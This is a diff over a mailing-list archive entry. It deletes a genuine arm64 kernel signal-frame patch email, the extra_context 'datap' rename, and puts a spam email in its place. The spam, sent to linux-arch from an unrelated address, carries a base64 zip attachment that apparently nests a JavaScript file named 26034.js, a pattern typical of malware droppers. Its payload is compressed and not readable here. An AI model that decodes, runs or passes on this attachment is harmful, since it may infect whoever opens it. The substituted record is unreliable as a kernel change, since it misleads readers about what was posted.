@@ -1,133 +1,80 @@
-From: Dave Martin <Dave.Martin@arm.com>
-Subject: [PATCH] fixup! arm64: signal: Allow expansion of the signal frame
-Date: Tue, 20 Jun 2017 17:24:36 +0100
-Message-ID: <1497975876-7055-1-git-send-email-Dave.Martin@arm.com>
-References: <20170619110346.GB3024@e104818-lin.cambridge.arm.com>
+From: <nfrankiyamu@centrum.cz>
+Subject: (unknown)
+Date: Tue, 20 Jun 2017 16:31:09 -0000
+Message-ID: <149797626929.30693.7277855913930178289@fourway.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="2590095223830.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-arch-owner@vger.kernel.org>
-Received: from foss.arm.com ([217.140.101.70]:41692 "EHLO foss.arm.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1750987AbdFTQYw (ORCPT <rfc822;linux-arch@vger.kernel.org>);
-        Tue, 20 Jun 2017 12:24:52 -0400
-In-Reply-To: <20170619110346.GB3024@e104818-lin.cambridge.arm.com>
+Received: from 74-118-118-90.fourway.net ([74.118.118.90]:52015 "HELO
+        fourway.net" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750773AbdFTQbP (ORCPT <rfc822;linux-arch@vger.kernel.org>);
+        Tue, 20 Jun 2017 12:31:15 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-arch-owner@vger.kernel.org
 List-ID: <linux-arch.vger.kernel.org>
-To: linux-arm-kernel@lists.infradead.org
-Cc: linux-arch@vger.kernel.org, Will Deacon <will.deacon@arm.com>, Catalin Marinas <catalin.marinas@arm.com>
+To: linux-arch@vger.kernel.org
 
-Convert extra_context.data to a u64 for better ABI independence.
-data is renamed to "datap" to give a stronger clue that it is
-a pointer.
-
-The binary interface is unchanged.
-
-Signed-off-by: Dave Martin <Dave.Martin@arm.com>
----
-
-I've build-tested this fixup only.
-
-The only change here is to replace the name "data" with "datap" in
-appropriate places and change void __user * to u64 appropriately, with
-casts in the two places where this value enters and exits the kernel.
-
- arch/arm64/include/uapi/asm/sigcontext.h |  6 +++---
- arch/arm64/kernel/signal.c               | 16 ++++++++--------
- 2 files changed, 11 insertions(+), 11 deletions(-)
-
-diff --git a/arch/arm64/include/uapi/asm/sigcontext.h b/arch/arm64/include/uapi/asm/sigcontext.h
-index 303a48c..f0a76b9 100644
---- a/arch/arm64/include/uapi/asm/sigcontext.h
-+++ b/arch/arm64/include/uapi/asm/sigcontext.h
-@@ -98,7 +98,7 @@ struct esr_context {
-  * 3) If extra_context is present, it must be followed immediately in
-  * sigcontext.__reserved[] by the terminating null _aarch64_ctx.
-  *
-- * 4) The extra space to which data points must start at the first
-+ * 4) The extra space to which datap points must start at the first
-  * 16-byte aligned address immediately after the terminating null
-  * _aarch64_ctx that follows the extra_context structure in
-  * __reserved[].  The extra space may overrun the end of __reserved[],
-@@ -111,8 +111,8 @@ struct esr_context {
- 
- struct extra_context {
- 	struct _aarch64_ctx head;
--	void __user *data;	/* 16-byte aligned pointer to extra space */
--	__u32 size;		/* size in bytes of the extra space */
-+	__u64 datap; /* 16-byte aligned pointer to extra space cast to __u64 */
-+	__u32 size; /* size in bytes of the extra space */
- 	__u32 __reserved[3];
- };
- 
-diff --git a/arch/arm64/kernel/signal.c b/arch/arm64/kernel/signal.c
-index 3602fb7..cb0d008 100644
---- a/arch/arm64/kernel/signal.c
-+++ b/arch/arm64/kernel/signal.c
-@@ -244,7 +244,7 @@ static int parse_user_sigframe(struct user_ctxs *user,
- 		u32 magic, size;
- 		char const __user *userp;
- 		struct extra_context const __user *extra;
--		void __user *extra_data;
-+		u64 extra_datap;
- 		u32 extra_size;
- 		struct _aarch64_ctx const __user *end;
- 		u32 end_magic, end_size;
-@@ -297,7 +297,7 @@ static int parse_user_sigframe(struct user_ctxs *user,
- 			extra = (struct extra_context const __user *)userp;
- 			userp += size;
- 
--			__get_user_error(extra_data, &extra->data, err);
-+			__get_user_error(extra_datap, &extra->datap, err);
- 			__get_user_error(extra_size, &extra->size, err);
- 			if (err)
- 				return err;
-@@ -321,14 +321,14 @@ static int parse_user_sigframe(struct user_ctxs *user,
- 			/* Prevent looping/repeated parsing of extra_context */
- 			have_extra_context = true;
- 
--			base = extra_data;
-+			base = (void __user *)extra_datap;
- 			if (!IS_ALIGNED((unsigned long)base, 16))
- 				goto invalid;
- 
- 			if (!IS_ALIGNED(extra_size, 16))
- 				goto invalid;
- 
--			if (extra_data != userp)
-+			if (base != userp)
- 				goto invalid;
- 
- 			/* Reject "unreasonably large" frames: */
-@@ -337,7 +337,7 @@ static int parse_user_sigframe(struct user_ctxs *user,
- 
- 			/*
- 			 * Ignore trailing terminator in __reserved[]
--			 * and start parsing extra_data:
-+			 * and start parsing extra data:
- 			 */
- 			offset = 0;
- 			limit = extra_size;
-@@ -501,7 +501,7 @@ static int setup_sigframe(struct rt_sigframe_user_layout *user,
- 
- 		struct extra_context __user *extra;
- 		struct _aarch64_ctx __user *end;
--		void __user *extra_data;
-+		u64 extra_datap;
- 		u32 extra_size;
- 
- 		extra = (struct extra_context __user *)userp;
-@@ -510,12 +510,12 @@ static int setup_sigframe(struct rt_sigframe_user_layout *user,
- 		end = (struct _aarch64_ctx __user *)userp;
- 		userp += TERMINATOR_SIZE;
- 
--		extra_data = userp;
-+		extra_datap = (u64)userp;
- 		extra_size = sfp + round_up(user->size, 16) - userp;
- 
- 		__put_user_error(EXTRA_MAGIC, &extra->head.magic, err);
- 		__put_user_error(EXTRA_CONTEXT_SIZE, &extra->head.size, err);
--		__put_user_error(extra_data, &extra->data, err);
-+		__put_user_error(extra_datap, &extra->datap, err);
- 		__put_user_error(extra_size, &extra->size, err);
- 
- 		/* Add the terminator */
--- 
-2.1.4
+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
+AABQSwUGAAAAAAEAAQBPAAAASA0AAAAA
